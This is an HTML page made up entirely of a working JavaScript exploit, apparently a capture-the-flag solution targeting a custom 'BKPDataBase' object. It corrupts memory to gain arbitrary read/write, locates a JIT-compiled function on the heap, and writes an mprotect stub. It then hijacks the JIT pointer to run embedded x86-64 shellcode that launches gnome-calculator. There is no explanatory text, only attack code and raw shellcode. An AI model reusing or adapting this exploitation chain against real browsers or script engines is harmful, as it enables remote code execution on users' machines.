<html>
<head>
   <title>a16 le sapeur</title>
</head>

<body>
   <div id="yolo"></div>
   <script type="text/javascript">  
   function zooby(shellcode) {
      try{             
      var db = BKPDataBase.create("a", "b");

      var _yolo = new Array(500);
      for (var i =0;i<500;i++)
         _yolo[i] = db.createStore(i.toString(16), 1, [0, 1, 2, 3, 4, 5], 1234);

      kst = db.createStore("A", 1, [0, 1, 2, 3, 4, 5], 1234);
      kst2 = db.createStore("B", 1, [0xbadb00b5, 0xdeadbeef, 2, 3, 4, 5], 0x5031337);   
      
      kst.remove(-1);      
      kst.insert(0, 0xffffffff00000001);

      var obj1_addr = null;
      var obj2_vector_addr = null;
      var obj2_vtable_idx = null;
      for (i=0;i<0x100;i++) {
         if (kst.get(i) == 0x5031337 && (kst.get(i-1) == kst.get(i-3))) {
            obj2_vtable_idx = i-6;
            obj2_vector_addr = kst.get(i-2);
            while (i++) {
               if (kst.get(i) == 0xbadb00b5 && kst.get(i+1) == 0xdeadbeef) {
                  obj1_addr = obj2_vector_addr - (i-3)*8;
                  break;
               }
            }
            break;
         }
      }
      
      if (obj1_addr == null) {
         document.location = window.location.href;
      } else {        
         function read_at(address) {
            kst.insert((obj2_vector_addr + 16 - obj1_addr)/8, address - obj2_vector_addr);
            return kst2.get(0);
         }
         function read_char(addr) { 
            return (read_at(addr-2) / 0x10000) & 0xff;
         }
         function write_at(addr, val) {
            read_at(addr);
            kst2.insert(0, val);
         }
         
         // shellcode str / targeted function object array
         var bab = shellcode; 
         targeted = function(a) {
            return 12345^a;
         } 
         _yol = new Array(20);
         for (i=0;i<20;i++)
            _yol[i] = bab;
         _yol[13] = targeted;
         func_addr = null;
            
            
         for (var jimbo = obj1_addr;func_addr == null;jimbo-=8) {
            chunksz = read_at(jimbo);
            if (chunksz < 0x20 || (chunksz & 0xf1) != chunksz)
               continue;
            chunksz -= chunksz & 1;
            nextsz = read_at(jimbo+chunksz);
            if (nextsz < 0x20 || (nextsz & 0xfff1) != nextsz || (nextsz&1)!=1)
               continue;
               
            heapaddr = read_at(jimbo+10*8);
            if ((heapaddr <= obj1_addr) || ((heapaddr & 0xfff) != 0))
               continue;
            if (heapaddr != read_at(jimbo + 11*8))
               continue;
            
            nbregions = read_at(jimbo+2*8);
            regsz = read_at(jimbo+4*8);
            heapsz = read_at(jimbo + 12*8);
            if (nbregions != 2 || ((heapsz & 0xfff) != 0) || ((regsz & 0xfff) != 0) || heapsz == 0 || nbregions*regsz != heapsz)
               continue;
      
            for (i=8;i<heapsz;i+=8) {
               babar = read_at(heapaddr + i);
               if (babar < obj1_addr) continue;
               match = true;
               for (j=1;j<20;j++) {
                  if (((j == 13) && (read_at(heapaddr + i + j*8) == babar)) || ((j != 13) && (read_at(heapaddr + i + j*8) != babar))) {
                     match = false;
                     break;
                  }
               }
               if (match == true) {
                  func_addr = read_at(heapaddr + i + 13*8);
                  sc_placeholder_obj = read_at(heapaddr + i + 12*8)
                  break;
               }
            }
         }
         
         targeted(1); // construct function's code
         jit_ptr = read_at(func_addr + 8*3) + 8*4
         jit_addr = read_at(jit_ptr)
         
         shellcode_addr = read_at(sc_placeholder_obj + 8*2) + 8*4;
         sc_addr_aligned = shellcode_addr - (shellcode_addr&0xfff);
         
         // mprotect stub + jmp back to original JIT address
         stub_addr = jit_addr + 0x1000 - (jit_addr&0xfff);   
         mp1 = "\x57\x56\x52\x48\xbf";
         mp2 = "\x6a\x0a\x6a\x07\x5a\x58\x5e\x0f\x05\x5a\x5e\x5f"        
         
         for (i=0;i<mp1.length;i++)
            write_at(stub_addr+i, mp1.charCodeAt(i));         
         write_at(stub_addr+i, sc_addr_aligned); i += 8;
         write_at(stub_addr+i, 0x68);
         write_at(stub_addr+i+1, 0x1000 + (shellcode_addr + shellcode.length > sc_addr_aligned + 0x1000 ? 0x1000 : 0)); i += 5;
         for (j=0;j<mp2.length;j++,i++)
            write_at(stub_addr+i, mp2.charCodeAt(j));  
         write_at(stub_addr+i, 0xb848);   
         write_at(stub_addr+i+2, jit_addr);   
         write_at(stub_addr+i+10, 0xe0ff);
         
         // jmp back after shellcode
         i = shellcode.length - 20;
         write_at(shellcode_addr+i, 0xb848);   
         write_at(shellcode_addr+i+2, jit_addr);   
         write_at(shellcode_addr+i+10, 0xe0ff);
         
         // JIT ptr -> mprotect
         write_at(jit_ptr, stub_addr);
         targeted(2);
         // JIT ptr -> shellcode
         write_at(jit_ptr, shellcode_addr);
         targeted(3);
                  
         //fixup corrupted objects
         read_at(obj2_vector_addr + 8*3);
         kst.insert(0, 0x500000001);
         kst.insert(2, 8*3);
         document.getElementById("yolo").innerHTML = "\\o/";
      }
      } catch(e) {};
   }
   
   // fork/execve shellcode with some space for the jmp back to the JIT function
   zooby("\x6a\x39\x58\x0f\x05\x48\x85\xc0\x75\x50\xeb\x1f\x5f\x6a\x00\x57\x48\x8d\x34\x24\xeb\x34\x5a\x6a\x00\x52\x48\x8d\x14\x24\x6a\x3b\x58\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05\xe8\xdc\xff\xff\xff\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x67\x6e\x6f\x6d\x65\x2d\x63\x61\x6c\x63\x75\x6c\x61\x74\x6f\x72\x00\xe8\xc7\xff\xff\xff\x44\x49\x53\x50\x4c\x41\x59\x3d\x3a\x30\x00AAAAAAAAAAAAAAAAAAAA");
   </script>
</body>
</html>